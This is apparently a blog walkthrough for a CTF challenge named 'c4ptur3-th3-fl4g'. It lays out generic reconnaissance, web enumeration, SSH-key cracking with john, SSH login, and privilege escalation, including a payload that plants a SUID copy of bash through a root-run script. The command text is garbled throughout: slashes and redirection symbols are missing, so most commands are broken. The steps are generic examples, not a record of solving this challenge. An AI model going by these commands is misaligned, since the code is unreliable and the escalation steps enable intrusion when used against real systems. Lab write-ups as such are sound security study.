---
title c4ptur3-th3-fl4g — CTF Walkthrough
date 2025-11-08
author: shivam
categories: [ctf, writeup, walkthrough]
tags: [c4ptur3-th3-fl4g, capture-the-flag, walkthrough]
summary: Step-by-step walkthrough for the CTF challenge c4ptur3-th3-fl4g. Covers reconnaissance, enumeration, exploitation, and post-exploit cleanup. Chirpy theme compatible.
image:
  path: /assets/img/TryHackMe/c4ptur3-th3-fl4g.png
---

# c4ptur3-th3-fl4g — CTF Walkthrough

Completed by Shivam Pakade
Completed on 2025-11-08
Difficulty Varies (Recon → Exploitation → Privilege Escalation)

---

## Table of contents

1. [Overview](#overview)
2. [Lab setup  notes](#lab-setup--notes)
3. [Recon — finding the target & services](#recon--finding-the-target-and-services)
4. [Web & file enumeration](#web--file-enumeration)
5. [Credential discovery & cracking](#credential-discovery--cracking)
6. [Initial access (pivot  remote access)](#initial-access)
7. [Privilege escalation & root flag](#privilege-escalation--root-flag)
8. [Post-exploit cleanup & persistence notes](#post-exploit-cleanup--persistence-notes)
9. [TL;DR — commands summary](#tldr-commands-summary)


---

## Overview {#overview}

This walkthrough documents a typical methodical approach to a CTF challenge titled c4ptur3-th3-fl4g. The goal is to demonstrate reproducible steps that lead from initial reconnaissance to capturing userroot flags and to provide clear commands and reasoning at each stage. Replace `$IP` with the target IP provided by the lab.

 Warning Only perform these steps on systems you own or are authorized to test (CTF labs, VulnHub, TryHackMe, etc.).

---

## Lab setup  notes {#lab-setup--notes}

 Target `c4ptur3-th3-fl4g` VM (IP given by platform).
 Attacker machine Kali  Parrot  Linux with common pentest tools installed (nmap, gobuster, nikto, john, ssh, curl, python3).
 Paths in this guide reference images stored at `assetsimgc4ptur3-th3-fl4g` (use those images in your Chirpy post).

---

## Recon — finding the target and services {#recon--finding-the-target-and-services}

Start with host discovery and port scan

```bash
# Ping (optional)
ping -c 3 $IP

# Full TCP scan (serviceversion)
nmap -Pn -sV -p- -T4 $IP -oN nmap_full.txt

# Targeted quick scan (common ports)
nmap -Pn -sV -p22,80,443,139,445 $IP -oN nmap_quick.txt
```

Look for open services (example results you might see) SSH (22), HTTP (80443), SMB (139445), RPC (111), custom ports.

Why Service list tells what attack surface exists (web apps, file shares, exposed keys).

---

## Web & file enumeration {#web--file-enumeration}

If HTTP is open, enumerate the webserver

```bash
# quick browser check
firefox http$IP

# directory fuzzing
gobuster dir -u http$IP -w usrsharewordlistsdirbcommon.txt -x php,txt,html,zip -o gobuster.txt

# probe with nikto for basic vulns
nikto -h http$IP -output nikto.txt
```

Search for

 `.git` or `.gitconfig` exposures
 `uploads`, `backup`, `dev`, `secret`
 config files (e.g., `config.php`, `.env`, `robots.txt` pointing to hidden paths)

If a directory contains a downloadable private key or config with credentials, download it

```bash
curl -sL http$IPsecretsecretKey -o secretKey
chmod 600 secretKey
```


---

## Credential discovery & cracking {#credential-discovery--cracking}

Common leaks

 Plaintext credentials in `.gitconfig` or `.env`
 Private SSH keys (may be passphrase-protected)
 Password hashes (shadow-like dumps or scripts)

If you find a private SSH key protected by a passphrase

```bash
# convert key for john
ssh2john secretKey  id_rsa.hash

# crack with john (using a wordlist)
john --wordlist=usrsharewordlistsrockyou.txt id_rsa.hash
```

If there's a bcryptsha hash, use `john` or `hashcat`. If you find a password fragment, a small brute script can attempt the remaining characters.


---

## Initial access {#initial-access}

With recovered credentials (usernamepassword or private key), attempt access

### SSH access

```bash
ssh -i secretKey user@$IP -o IdentitiesOnly=yes
# or
ssh user@$IP
```

If web login credentials were found, try site logins or admin panels. If you can upload files to an upload directory and the server executes them, that’s a remote code execution path.

When you obtain a shell, perform immediate enumeration

```bash
whoami; id; hostname; uname -a
pwd; ls -la
ps aux --cols 200
sudo -l
```

Collect the user flag (commonly `user.txt` or `~user.txt`)

```bash
find  -maxdepth 3 -type f -iname user.txt 2devnull
cat ~user.txt
```


---

## Privilege escalation & root flag {#privilege-escalation--root-flag}

Privilege escalation is highly environment-specific — common patterns

1. Sudo misconfigurations

    `sudo -l` reveals commands the user can run as root. If a writable script is run as root, modify it to spawn a root shell.

2. SUID binaries

    List SUID files `find  -perm -4000 -type f 2devnull`
    Look for known vulnerable SUID programs.

3. Cron jobs  world-writable files

    Check cron `ls -la etccron varspoolcron`
    Inspect scripts executed by cron or services that run as root.

4. Exposed host mounts  container escapes

    If you find dockerlxd sockets or mount points, they can allow host access.

Example user can run `usrlocalbindeploy` as root and that deploy script loads files from `tmp` — you can place a malicious executable or modify `$PATH` to get root.

```bash
# pseudo-steps (example)
echo 'cp binbash tmprootbash; chmod +s tmprootbash'  tmppayload.sh
# trigger root-runner to execute payload
usrlocalbindeploy tmppayload.sh
tmprootbash -p   # now root
```

Once root, locate the root flag

```bash
find  -maxdepth 3 -type f -iname root.txt 2devnull
cat rootroot.txt
```

---

## Post-exploit cleanup & persistence notes {#post-exploit-cleanup--persistence-notes}

In a real engagement

 Remove any uploaded tools, payloads and reverse shells.
 Restore modified files if possible.
 Do not leave backdoors or keys behind.

For CTF writeups keep your commands documented, do not leave secrets in public repositories.

---

## TL;DR — commands summary {#tldr-commands-summary}

```bash
# Recon
nmap -Pn -sV -p- $IP -oN nmap_full.txt

# Web enumeration
gobuster dir -u http$IP -w usrsharewordlistsdirbcommon.txt -x php,txt,html

# Download secretkey
curl -sL http$IPsecretsecretKey -o secretKey && chmod 600 secretKey

# Crack key if passphrase-protected
ssh2john secretKey  id_rsa.hash
john --wordlist=usrsharewordlistsrockyou.txt id_rsa.hash

# SSH in
ssh -i secretKey user@$IP -o IdentitiesOnly=yes

# On target enumeration
whoami; id; sudo -l; find  -maxdepth 3 -type f -iname user.txt

# Escalation (example)
sudo pathtoallowedscript
# or exploit SUID  cron
```

---

